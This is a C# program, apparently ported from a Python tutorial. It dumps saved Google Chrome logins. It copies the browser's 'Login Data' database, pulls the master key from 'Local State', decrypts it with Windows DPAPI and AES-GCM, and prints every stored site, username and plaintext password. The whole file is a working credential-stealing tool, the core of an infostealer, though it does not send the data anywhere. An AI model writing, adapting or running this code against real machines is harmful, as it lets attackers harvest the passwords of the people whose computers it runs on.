using System;
using System.IO;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Microsoft.Data.Sqlite;
using Dapper;
using ExtractCookiesFromBrowser.Helpers;
using ExtractCookiesFromBrowser.Models;

namespace ExtractCookiesFromBrowser
{
    //Ported from python source https://www.thepythoncode.com/article/extract-chrome-passwords-python
    public class Program
    {
        static async Task Main(string[] args)
        {
            var dbPath = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE") ?? "", "AppData", "Local",
                "Google", "Chrome", "User Data", "default", "Login Data");

            var destPath = Path.Combine(AppContext.BaseDirectory, "ChromeData.db");
            if (File.Exists(destPath)) File.Delete(destPath);
            File.Copy(dbPath, destPath, true);

            await using var connection = new SqliteConnection($"Data Source={destPath}");
            await connection.OpenAsync();
            const string querySql = "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created";
            DapperCustomMapper.RegisterCustomMap<LoginData>();
            var data = await connection.QueryAsync<LoginData>(querySql);
            var key = await GetEncryptionKeyAsync();
            foreach (var password in data)
            {
                var decryptedPassword = DecryptPassword(password.PasswordValue, key);
                Console.WriteLine($"Origin Url: {password.OriginUrl}");
                Console.WriteLine($"Action Url: {password.ActionUrl}");
                Console.WriteLine($"Username:: {password.UsernameValue}");
                Console.WriteLine($"Password:: {decryptedPassword}");

                Console.WriteLine(new string('=', 50));
            }
        }

        private static async Task<string> GetEncryptionKeyAsync()
        {
            var localStatePath = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE") ?? "", "AppData", "Local",
                "Google", "Chrome", "User Data", "Local State");

            var localStateContent = await File.ReadAllTextAsync(localStatePath, Encoding.UTF8);

            using var doc = JsonDocument.Parse(localStateContent);
            var payload = doc.RootElement.Clone();
            var localState = payload.GetProperty("os_crypt")
                .GetProperty("encrypted_key")
                .GetString();

            if (localState == null) throw new NullReferenceException();

            var keyBytes = Convert.FromBase64String(localState);
            keyBytes = keyBytes[5..];

            var data = DPAPI.Decrypt(Convert.ToBase64String(keyBytes));

            return data;
        }

        private static string DecryptPassword(byte[] encryptedPassword, string key)
        {
            try
            {
                var decrypted = Cryptography.DecryptInGcmMode(encryptedPassword, key);
                var decryptedText = Encoding.UTF8.GetString(decrypted);
                return decryptedText;
            }
            catch (Exception e)
            {
                try
                {
                    var data = DPAPI.Decrypt(Convert.ToBase64String(encryptedPassword));
                    return data;
                }
                catch (Exception exception)
                {
                    return "";
                }
            }
        }
    }
}